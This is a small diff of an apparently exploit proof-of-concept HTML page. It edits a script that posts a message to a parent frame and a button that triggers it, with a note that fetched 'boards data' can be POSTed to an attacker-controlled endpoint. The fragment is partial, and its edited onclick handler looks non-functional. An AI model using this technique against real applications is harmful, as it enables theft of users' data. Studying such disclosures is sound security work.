@@ -15,7 +15,7 @@
         alert(error);
       });
     
-    sendOneDriveMessage = () => {
+    window.sendOneDriveMessage = () => {
       window.parent.postMessage({
         data:
           {
@@ -31,7 +31,7 @@
       });
     };
   </script>
-  <button onclick="sendOneDriveMessage">Send</button>
+  <button onclick="() => window.sendOneDriveMessage()">Send</button>
   Get all boards data.
   After fetching data it can be sent to attacker using POST request to any attacker controlled endpoint:
 </body>
